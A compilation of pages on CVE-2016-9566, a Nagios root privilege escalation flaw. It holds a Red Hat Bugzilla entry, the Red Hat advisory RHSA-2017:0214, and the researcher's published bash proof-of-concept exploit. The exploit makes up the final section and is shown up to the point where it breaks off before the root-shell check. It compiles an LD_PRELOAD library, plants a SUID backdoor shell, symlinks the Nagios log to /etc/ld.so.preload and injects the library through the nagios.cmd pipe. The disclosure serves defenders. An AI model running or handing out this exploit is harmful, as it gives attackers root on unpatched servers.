    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1402869**](show_bug.cgi?id=1402869)
(CVE-2016-9566)
- [CVE-2016-9566](https://access.redhat.com/security/cve/CVE-2016-9566) nagios: Privilege escalation issue

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-9566 nagios: Privilege escalation issue

| | [Keywords](describekeywords.cgi): | Reopened  Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-9566 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1402870](show_bug.cgi?id=1402870 "CLOSED ERRATA - CVE-2016-9566 nagios: Privilege escalation issue [fedora-all]") [1402871](show_bug.cgi?id=1402871 "CLOSED ERRATA - CVE-2016-9566 nagios: Privilege escalation issue [epel-all]") [1406780](show_bug.cgi?id=1406780) [1413480](show_bug.cgi?id=1413480) [1413481](show_bug.cgi?id=1413481) [1413482](show_bug.cgi?id=1413482) [1413483](show_bug.cgi?id=1413483) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1402874](show_bug.cgi?id=1402874) [1415899](show_bug.cgi?id=1415899) [1417519](show_bug.cgi?id=1417519) | | TreeView+ | [depends on](buglist.cgi?bug_id=1402869&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1402869&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-12-08 14:08 UTC by Adam Mariš | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-17 02:54 UTC ([History](show_activity.cgi?id=1402869)) | | [CC List:](page.cgi?id=fields.html#cclist) | 37 users (show)  affix apevec avibelli chrisw cvsbot-xmlrpc gsterlin jbalunas jose.p.oliveira.oss jschluet jshepherd julthomas kbasil lemenkov lhh lpeer markmc mmagr ondrejj rbryant rcyriac redhat rhs-bugs rrajasek sclewis sgirijan shawn.starr sisharma slong smooge srevivo ssaha s storage-qa-internal swilkerson tdecacqu tkirby vbellur | | Fixed In Version: | nagios 4.2.4 | | | Doc Type: | Bug Fix | | | Doc Text: | A privilege escalation flaw was found in the way Nagios handled log files. An attacker able to control the Nagios logging configuration (the 'nagios' user/group) could use this flaw to elevate their privileges to root. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-08 03:03:52 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2017:0211](https://access.redhat.com/errata/RHSA-2017%3A0211) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:53:01 UTC | | Red Hat Product Errata | [RHSA-2017:0212](https://access.redhat.com/errata/RHSA-2017%3A0212) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:52:41 UTC | | Red Hat Product Errata | [RHSA-2017:0213](https://access.redhat.com/errata/RHSA-2017%3A0213) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:52:24 UTC | | Red Hat Product Errata | [RHSA-2017:0214](https://access.redhat.com/errata/RHSA-2017%3A0214) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-01-31 10:52:08 UTC | | Red Hat Product Errata | [RHSA-2017:0258](https://access.redhat.com/errata/RHSA-2017%3A0258) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-02-07 16:16:36 UTC | | Red Hat Product Errata | [RHSA-2017:0259](https://access.redhat.com/errata/RHSA-2017%3A0259) | 0 | normal | SHIPPED\_LIVE | Important: nagios security update | 2017-02-07 16:16:26 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1402869#c0)  Adam Mariš    2016-12-08 14:08:40 UTC  ``` An unsafe file opening/creation of logging files that can be misused for root privilege escalation was found in base/logging.c.  Upstream patch:  <https://github.com/NagiosEnterprises/nagioscore/commit/c29557dec91eba2306f5fb11b8da4474ba63f8c4>   ```  [Comment 1](show_bug.cgi?id=1402869#c1)  Adam Mariš    2016-12-08 14:09:13 UTC  ```  Created nagios tracking bugs for this issue:  Affects: fedora-all [[bug 1402870](show_bug.cgi?id=1402870 "CLOSED ERRATA - CVE-2016-9566 nagios: Privilege escalation issue [fedora-all]")] Affects: epel-all [[bug 1402871](show_bug.cgi?id=1402871 "CLOSED ERRATA - CVE-2016-9566 nagios: Privilege escalation issue [epel-all]")]   ```  [Comment 5](show_bug.cgi?id=1402869#c5)  Jason Shepherd    2016-12-15 04:00:35 UTC  ``` An openshift user account is required to get access to the RHMAP Monitoring with Nagios, ref:    <https://access.redhat.com/documentation/en/red-hat-mobile-application-platform/4.2/paged/operations-guide/chapter-1-monitoring-rhmap-with-nagios#retrieving-nagios-login-credentials>   ```  [Comment 6](show_bug.cgi?id=1402869#c6)  Adam Mariš    2016-12-16 09:49:21 UTC  ``` External Reference:  <https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>   ```  [Comment 7](show_bug.cgi?id=1402869#c7)  Andrej Nemec    2016-12-21 09:02:32 UTC  ``` References:  <http://seclists.org/oss-sec/2016/q4/715>   ```  [Comment 10](show_bug.cgi?id=1402869#c10)  errata-xmlrpc    2017-01-31 05:53:37 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 7.0 (Kilo) for RHEL 7  Via RHSA-2017:0214 <https://rhn.redhat.com/errata/RHSA-2017-0214.html>   ```  [Comment 11](show_bug.cgi?id=1402869#c11)  errata-xmlrpc    2017-01-31 05:55:01 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 6.0 (Juno) for RHEL 7  Via RHSA-2017:0213 <https://rhn.redhat.com/errata/RHSA-2017-0213.html>   ```  [Comment 12](show_bug.cgi?id=1402869#c12)  errata-xmlrpc    2017-01-31 05:56:21 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 6  Via RHSA-2017:0212 <https://rhn.redhat.com/errata/RHSA-2017-0212.html>   ```  [Comment 13](show_bug.cgi?id=1402869#c13)  errata-xmlrpc    2017-01-31 05:57:52 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 7  Via RHSA-2017:0211 <https://rhn.redhat.com/errata/RHSA-2017-0211.html>   ```  [Comment 15](show_bug.cgi?id=1402869#c15)  errata-xmlrpc    2017-02-07 11:16:45 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 6  Via RHSA-2017:0259 <https://rhn.redhat.com/errata/RHSA-2017-0259.html>   ```  [Comment 16](show_bug.cgi?id=1402869#c16)  errata-xmlrpc    2017-02-07 11:17:48 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 7  Via RHSA-2017:0258 <https://rhn.redhat.com/errata/RHSA-2017-0258.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1402869&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from rhn.redhat.com_ce171775_20250124_212413.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:0214 - Security Advisory

Issued:
2017-01-31
Updated:
2017-01-31
# RHSA-2017:0214 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: nagios security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0214)

## Topic

An update for nagios is now available for Red Hat Enterprise Linux OpenStack Platform 7.0 (Kilo) for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nagios is a program that monitors hosts and services on your network, and has the ability to send email or page alerts when a problem arises or is resolved. Nagios is written in C and designed to run under Linux (and some other \*NIX variants) as a background process, intermittently running checks on various services that you specify. The actual service checks are performed by separate "plugin" programs which return the status of the checks to Nagios. Nagios plugins are available at <http://sourceforge.net/projects/nagiosplug.> This package provides the core program, web interface, and documentation files for Nagios. Development files are built as a separate package.

Security Fix(es):

* Various command-execution flaws were found in the Snoopy library included with Nagios. These flaws allowed remote attackers to execute arbitrary commands by manipulating Nagios HTTP headers. (CVE-2008-7313, CVE-2014-5008, CVE-2014-5009)
* It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. (CVE-2016-9565)
* A privileges flaw was found in Nagios where log files were unsafely handled. An attacker who could control Nagios logging configuration ('nagios' user/group) could exploit the flaw to elevate their access to that of a privileged user. (CVE-2016-9566)

Red Hat would like to thank Dawid Golunski for reporting CVE-2016-9565 and CVE-2016-9566.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat OpenStack 7 x86\_64

## Fixes

* [BZ - 1121497](https://bugzilla.redhat.com/show_bug.cgi?id=1121497)
  - CVE-2008-7313 CVE-2014-5008 CVE-2014-5009 snoopy: incomplete fixes for command execution flaws
* [BZ - 1402869](https://bugzilla.redhat.com/show_bug.cgi?id=1402869)
  - CVE-2016-9566 nagios: Privilege escalation issue
* [BZ - 1405363](https://bugzilla.redhat.com/show_bug.cgi?id=1405363)
  - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

## CVEs

* [CVE-2008-7313](https://www.redhat.com/security/data/cve/CVE-2008-7313.html)
* [CVE-2014-5008](https://www.redhat.com/security/data/cve/CVE-2014-5008.html)
* [CVE-2014-5009](https://www.redhat.com/security/data/cve/CVE-2014-5009.html)
* [CVE-2016-9565](https://www.redhat.com/security/data/cve/CVE-2016-9565.html)
* [CVE-2016-9566](https://www.redhat.com/security/data/cve/CVE-2016-9566.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat OpenStack 7

| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el7.src.rpm | SHA-256: 22be84749fe4d4876bf2252ea1ecfae60b887499272dd2c1664a3620ed20d636 |
| x86\_64 | |
| nagios-3.5.1-9.el7.x86\_64.rpm | SHA-256: 7888c2212b5be85dff6f97fdfa4518ee4b16e899e6dfc36bc83e4936f0c76400 |
| nagios-common-3.5.1-9.el7.x86\_64.rpm | SHA-256: 8e13e8b11bf94b0d3d2e0c2a9eaed02f82482a3191dbe30a40565b521f59a120 |
| nagios-debuginfo-3.5.1-9.el7.x86\_64.rpm | SHA-256: e92f087a7d2b3083f049929fd439e2a5de38cc817d5c9f1fa48c1672d4514feb |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from legalhackers.com_aff97066_20250126_033742.html ===
#!/bin/bash
#
# Nagios Core < 4.2.4 Root Privilege Escalation PoC Exploit
# nagios-root-privesc.sh (ver. 1.0)
#
# CVE-2016-9566
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid\_golunski for updates on this advisory
#
#
# [Info]
#
# This PoC exploit allows privilege escalation from 'nagios' system account,
# or an account belonging to 'nagios' group, to root (root shell).
# Attackers could obtain such an account via exploiting another vulnerability,
# e.g. CVE-2016-9565 linked below.
#
# [Exploit usage]
#
# ./nagios-root-privesc.sh path\_to\_nagios.log
#
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# Video PoC:
# https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# CVE-2016-9565:
# https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html
#
# Disclaimer:
# For testing purposes only. Do no harm.
#
BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nagiosrootsh"
PRIVESCLIB="/tmp/nagios\_privesc\_lib.so"
PRIVESCSRC="/tmp/nagios\_privesc\_lib.c"
SUIDBIN="/usr/bin/sudo"
commandfile='/usr/local/nagios/var/rw/nagios.cmd'
function cleanexit {
# Cleanup
echo -e "\n[+] Cleaning up..."
rm -f $PRIVESCSRC
rm -f $PRIVESCLIB
rm -f $ERRORLOG
touch $ERRORLOG
if [ -f /etc/ld.so.preload ]; then
echo -n > /etc/ld.so.preload
fi
echo -e "\n[+] Job done. Exiting with code $1 \n"
exit $1
}
function ctrl\_c() {
echo -e "\n[+] Ctrl+C pressed"
cleanexit 0
}
#intro
echo -e "\033[94m \nNagios Core - Root Privilege Escalation PoC Exploit (CVE-2016-9566) \nnagios-root-privesc.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"
# Priv check
echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q nagios
if [ $? -ne 0 ]; then
echo -e "\n[!] You need to execute the exploit as 'nagios' user or 'nagios' group ! Exiting.\n"
exit 3
fi
# Set target paths
ERRORLOG="$1"
if [ ! -f "$ERRORLOG" ]; then
echo -e "\n[!] Provided Nagios log path ($ERRORLOG) doesn't exist. Try again. E.g: \n"
echo -e "./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log\n"
exit 3
fi
# [ Exploitation ]
trap ctrl\_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<\_solibeof\_>$PRIVESCSRC
#define \_GNU\_SOURCE
#include
#include
#include
#include
#include
#include
#include
uid\_t geteuid(void) {
static uid\_t (\*old\_geteuid)();
old\_geteuid = dlsym(RTLD\_NEXT, "geteuid");
if ( old\_geteuid() == 0 ) {
chown("$BACKDOORPATH", 0, 0);
chmod("$BACKDOORPATH", 04777);
unlink("/etc/ld.so.preload");
}
return old\_geteuid();
}
\_solibeof\_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
cleanexit 2;
fi
# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"
# Safety check
if [ -f /etc/ld.so.preload ]; then
echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
exit 2
fi
# Symlink the Nagios log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
cleanexit 3
fi
echo -e "\n[+] The system appears to be exploitable (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"
{
# Wait for Nagios to get restarted
echo -ne "\n[+] Waiting for Nagios service to get restarted...\n"
echo -n "Do you want to shutdown the Nagios daemon to speed up the restart process? ;) [y/N] "
read THE\_ANSWER
if [ "$THE\_ANSWER" = "y" ]; then
/usr/bin/printf "[%lu] SHUTDOWN\_PROGRAM\n" `date +%s` > $commandfile
fi
sleep 3s
ps aux | grep -v grep | grep -i 'bin/nagios'
if [ $? -ne 0 ]; then
echo -ne "\n[+] Nagios stopped. Shouldn't take long now... ;)\n"
fi
while :; do
sleep 1 2>/dev/null
if [ -f /etc/ld.so.preload ]; then
rm -f $ERRORLOG
break;
fi
done
echo -e "\n[+] Nagios restarted. The /etc/ld.so.preload file got created with the privileges: \n`ls -l /etc/ld.so.preload`"
# /etc/ld.so.preload should be owned by nagios:nagios at this point with perms:
# -rw-r--r-- 1 nagios nagios
# Only 'nagios' user can write to it, but 'nagios' group can not.
# This is not ideal as in scenarios like CVE-2016-9565 we might be running as www-data:nagios user.
# We can bypass the lack of write perm on /etc/ld.so.preload by writing to Nagios external command file/pipe
# nagios.cmd, which is writable by 'nagios' group. We can use it to send a bogus command which will
# inject the path to our privesc library into the nagios.log file (i.e. the ld.so.preload file :)
sleep 3s # Wait for Nagios to create the nagios.cmd pipe
if [ ! -p $commandfile ]; then
echo -e "\n[!] Nagios command pipe $commandfile does not exist!"
exit 2
fi
echo -e "\n[+] Injecting $PRIVESCLIB via the pipe nagios.cmd to bypass lack of write perm on ld.so.preload"
now=`date +%s`
/usr/bin/printf "[%lu] NAGIOS\_GIVE\_ME\_ROOT\_NOW!;; $PRIVESCLIB \n" $now > $commandfile
sleep 1s
grep -q "$PRIVESCLIB" /etc/ld.so.preload
if [ $? -eq 0 ]; then
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload | grep "$PRIVESCLIB"`"
else
echo -e "\n[!] Unable to inject the lib to /etc/ld.so.preload"
exit 2
fi
} 2>/dev/null
# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Triggering privesc code from $PRIVESCLIB by executing $SUIDBIN SUID binary"
sudo 2>/dev/null >/dev/null
# Check for the rootshell
